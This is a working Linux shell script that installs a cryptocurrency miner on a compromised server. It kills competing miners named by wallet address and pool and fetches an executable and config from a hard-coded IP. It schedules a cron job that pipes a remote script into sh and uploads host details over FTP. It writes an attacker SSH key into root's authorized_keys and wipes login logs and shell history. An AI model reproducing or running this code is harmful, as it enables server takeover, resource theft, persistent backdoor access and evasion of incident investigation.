#!/bin/bash
IKILLYOU () {
pkill -f ssuspsplk
pkill -f gpg-agentd


}



CRON () {
  if [ -x /usr/bin/wget ] ; then
        echo '*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh' > /tmp/.bla.cron
    elif [ -x /usr/bin/curl ] ; then
        echo '*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh' > /tmp/.bla.cron
    #else
    #    exit 0;
    fi
    crontab -r
    crontab /tmp/.bla.cron
    rm -f /tmp/.bla.cron
}
FIRE () {
PS3=$(iptables -L | grep 6379 | wc -l)
if [ $PS3 -eq 0 ];
then
yum -y install iptables-services
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
service iptables save
/etc/init.d/iptables-persistent save
fi
}

if [ ! -f "/usr/bin/ftp" ];then
apt install ftp -y
apt-get install ftp -y
aptitude install ftp -y
yum -y install ftp
fi

INFO () {
fname=`hostname`
cd /tmp
if [ ! -f "/tmp/ip.php" ];then
if [ -x /usr/bin/wget ] ; then
wget http://84.73.251.157:81/ip/ip.php --user-agent='GET IP Wget'
fname=`cat ./ip.php`
elif [ -x /usr/bin/curl ] ; then
fname=`curl -fsSL http://84.73.251.157:81/ip/ip.php -A "GET IP Curl"`
fi
fi
ps aux > /tmp/$fname.log
uname -m >> /tmp/$fname.log
cat /proc/version >> /tmp/$fname.log
cat /etc/issue >> /tmp/$fname.log
cat `ls /etc/*{-,_}{release,version} 2>/dev/null | head -n 1` >> /tmp/$fname.log
lsb_release -a >> /tmp/$fname.log
/tmp/crondb --help >> /tmp/$fname.log
curl -u xxx:xxx -T /tmp/$fname.log ftp://84.73.251.157/home/xxx/
rm -f /tmp/$fname.log
}

DOWNLOAD () {
if [ ! -f "/tmp/crondb" ];then
    wget http://84.73.251.157:81/crondb -O /tmp/crondb && chmod +x /tmp/crondb && wget http://84.73.251.157:81/c.j -O /tmp/c.j
fi

PS2=$(ps aux | grep crondb | grep -v "grep" | wc -l)
if [ $PS2 -eq 0 ];then
    export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH
    chmod 0755 /tmp/crondb
    /tmp/crondb -c /tmp/c.j -B
fi
}

IKILLYOU
FIRE
DOWNLOAD
INFO
CRON


echo "" > /var/log/wtmp
echo "" > /var/log/secure
history -c

exit 0;
chmod 0644 /tmp/linuxsyn
chmod 0644 /tmp/clay
chmod 0644 /tmp/udevs
chmod 0644 /tmp/psql
chmod 0644 /tmp/smartd
chmod 0644 /tmp/unixinfect/redisscan.sh
chmod 0644 /tmp/unixinfect/ebscan.sh
chmod 0644 /var/tmp/gpg-agent
chmod 0644 /usr/bin/gpg-agentd
chmod 0644 /tmp/kethelper
echo "" > /tmp/unixinfect/imworking
#echo "" > /var/spool/cron/root
#echo "" > /var/spool/cron/crontabs/root


PS3=$(iptables -L | grep 6379 | wc -l)
if [ $PS3 -eq 0 ];
then
yum -y install iptables-services
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
service iptables save
/etc/init.d/iptables-persistent save
fi



CLEAN ()
{
  grep -q -F '* soft memlock 262144' /etc/security/limits.conf || echo '* soft memlock 262144' >> /etc/security/limits.conf
    grep -q -F '* hard memlock 262144' /etc/security/limits.conf || echo '* hard memlock 262144' >> /etc/security/limits.conf
    grep -q -F 'vm.nr_hugepages = 256' /etc/sysctl.conf || echo 'vm.nr_hugepages = 256' >> /etc/sysctl.conf
    sysctl -w vm.nr_hugepages=256

  RMLIST=(/tmp/*index_bak* /tmp/*httpd.conf* /tmp/*httpd.conf /tmp/a7b104c270 /tmp/Carbon)
  KILIST=(crobon sb1 wipefs tmp/linuxsyn tmp/clay tmp/udevs AnXqV.yam zhuabcn@yahoo.com monerohash.com /tmp/java /tmp/a7b104c270 stratum.f2pool.com:8888 42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQt989KEfGRt6Ww2Xg8 46SDR76rJ2J6MtmP3ZZKi9cEA5RQCrYgag7La3CxEootQeAQULPE2CHJQ4MRZ5wZ1T73Kw6Kx4Lai2dFLAacjerbPzb5Ufg 42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe xmrpool.eu mine.moneropool.com xmr.crypto-pool.fr:8080 xmr.crypto-pool.fr:3333 xmr.crypto-pool.fr:6666 xmr.crypto-pool.fr:7777 xmr.crypto-pool.fr:443)
  for item in ${RMLIST[@]}
  do
      rm -rf $item
  done
  for item in ${KILIST[@]}
  do
      ps auxf|grep -v grep|grep $item|awk '{print $2}'|xargs kill -9
  done
  days=$(($(date +%s) / 60 / 60 / 24))
  ps auxf|grep -v grep|grep "42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "45cToD1FzkjAxHRBhYKKLg5utMGENqyamWrY8nLNkVQ4hJgLHex1KNRZcz4finRjMpAYmPxDaXVpN2rV1jMNyXRdMEaH1YA"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep ${days}|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "logind.conf"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "kworker"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "Silence"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "45hsTaSqTQM4K1Xeqkcy7eLzqdEuQ594fJVmQryCemQSCU878JGQdSDCxbhNyVjSkiaYat8yAfBuRTPSEUPZoARm9a5XEHZ"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "xmr.crypto-pool.fr"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "t.sh"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "wipefs"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "carbon"|awk '{print $2}'|xargs kill -9
  pkill -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4
  pkill -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB
  pkill -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df
  pkill -f stockman
  pkill -f gpg-agent
  pkill -f gpg-agentd
  pkill -f cpuloadtest
  pkill -f crypto-pool
  pkill -f vfcgewubhjnk
  pkill -f linuxprivchecker
  pkill -f xmr
  pkill -f kethelper
  pkill -f smartd
  pkill -f supsplk
  pkill -f psql
  pkill -f masscan
  pkill -f prohash
  pkill -f monero
  pkill -f miner
  pkill -f BoomBoom
  pkill -f BoomBoom2
  pkill -f nanopool
  pkill -f minergate
  pkill -f yam
  pkill -f Silence
  pkill -f yam2
  pkill -f minerd
  pkill -f Circle_MI.png
  pkill -f curl
  ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "crypto-pool"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "prohash"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "monero"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "miner"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "nanopool"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "minergate"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "49JsSwt7MsH5m8DPRHXFSEit9ZTWZCbWwS7QSMUTcVuCgwAU24gni1ydnHdrT9QMibLtZ3spC7PjmEyUSypnmtAG7pyys7F"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"|awk '{print $2}'|xargs kill -9
  ps auxf|grep -v grep|grep "11231"|awk '{print $2}'|xargs kill -9
  pkill -f biosetjenkins
  ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
  ps ax|grep -o './[0-9]* -c'| xargs pkill -f
  pkill -f Loopback
  pkill -f apaceha
  pkill -f cryptonight
  ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs ps --ppid|awk '{print $1}'|grep -v PID|xargs kill -9
  ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs kill -9
  pkill -f 45.76.102.45
  pkill -f fri3nds
  pkill -f redisscan
  pkill -f linuxsyn  
  pkill -f stratum
  pkill -f mixnerdx
  pkill -f performedl
  pkill -f sleep
  pkill -f JnKihGjn
  pkill -f irqba2anc1
  pkill -f irqba5xnc1
  pkill -f irqbnc1
  pkill -f ir29xc1
  pkill -f conns
  pkill -f irqbalance
  pkill -f crypto-pool
  pkill -f minexmr
  pkill -f XJnRj
  pkill -f NXLAi
  pkill -f BI5zj
  pkill -f askdljlqw
  pkill -f minerd
  pkill -f minergate
  pkill -f Guard.sh
  pkill -f ysaydh
  pkill -f bonns
  pkill -f donns
  pkill -f kxjd
  pkill -f 108.61.186.224
  pkill -f Duck.sh
  pkill -f bonn.sh
  pkill -f conn.sh
  pkill -f kworker34
  pkill -f kw.sh
  pkill -f pro.sh
  pkill -f polkitd
  pkill -f acpid
  pkill -f icb5o
  pkill -f nopxi
  ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;
  pkill -f 45.76.146.166
  pkill -f irqbalanc1
  pkill -f 188.120.247.175
  rm -rf /tmp/httpd.conf
  rm -rf /tmp/conn
  rm -rf /tmp/conns
  rm -f /tmp/irq.sh
  rm -f /tmp/irqbalanc1
  rm -f /tmp/irq
}

INIT () {
	echo 128 > /proc/sys/vm/nr_hugepages
	sysctl -w vm.nr_hugepages=128
}
ITABLE () {
    iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
    iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
}

CRON () {
  if [ -x /usr/bin/wget ] ; then
        echo '*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh' > /tmp/.bla.cron
    elif [ -x /usr/bin/curl ] ; then
        echo '*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh' > /tmp/.bla.cron
    else
        exit 0;
    fi
    crontab -r
    crontab /tmp/.bla.cron
    rm -f /tmp/.bla.cron
}


CLEAN
INIT


#rm -rf /var/lib/apt/lists/*
#apt-get update
#apt-get install wget -y
#apt-get install libcurl4-openssl-dev -y
#apt-get install git -y
#apt-get install make -y
#apt-get install python-pip -y
#apt-get install ca-certificates -y
#apt-get install redis-tools -y
#apt-get install python gcc -y
#apt-get install python-setuptools python-dev build-essential -y --allow-unauthenticated
#yum -y install epel-release
#yum -y install wget gcc redis git python-pip ca-certificates
#pip install -v requests -i https://pypi.python.org/simple/
#pip install -v impacket -i https://pypi.python.org/simple/
#pip install -v pyasn1 -i https://pypi.python.org/simple/

if [ ! -f "/tmp/crondb" ];then
    wget http://84.73.251.157:81/crondb -O /tmp/crondb && chmod +x /tmp/crondb
    wget http://84.73.251.157:81/c.j -O /tmp/c.j
fi

PS3=$(strings /lib64/libc.so.6 |grep GLIBC_2.14 | wc -l)
if [[ $PS3 -eq 0 && -e /etc/redhat-release && ! -e /opt/glibc-2.14/lib/libc.so.6 ]];then
    wget http://84.73.251.157:81/glibc.tar.gz -O /tmp/glibc-2.14.tar.gz && tar zxvf /tmp/glibc-2.14.tar.gz -C / && export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH && /tmp/crondb -c /tmp/c.j -B && echo "" > /var/log/wtmp && echo "" > /var/log/secure && history -c 
fi

PS2=$(ps aux | grep crondb | grep -v "grep" | wc -l)
if [ $PS2 -eq 0 ];then
    export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH
    chmod 0755 /tmp/crondb
    /tmp/crondb -c /tmp/c.j -B
fi


mkdir -p /root/.ssh/
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDghDcHsc3r/iGhguCF67YId4AM413E+Qo30GT2NAqnkmv3EDELet3neAKs7+i/RgzNGgGxiqSnFSAzAuNe6QM9hsXEypzo1nvBonSchc2xc7woBVN1aGteRzFiopyvoeFkruwoTzMfEXIvyo99qhVZch+4iHkiD6fAe5fXE5Pb80UYCj8FPIxEbifzQx9siG6sZaZKolmIR7WjMKpyROFCtbPL2MLAr9gVrrU+w5uuirv5XKDcymyFpbRstE7gdhOcbh2OTGgaQmGWO7/l6Bg2nST63PG0+9f9cZLxGW+BgodCt+tuEMM8fymI5ogp03gx6Jj/RrN3EnFmRx9aLAH7 Jackal" > /root/.ssh/authorized_keys
echo "" > /var/log/wtmp
echo "" > /var/log/secure
history -c 
CRON

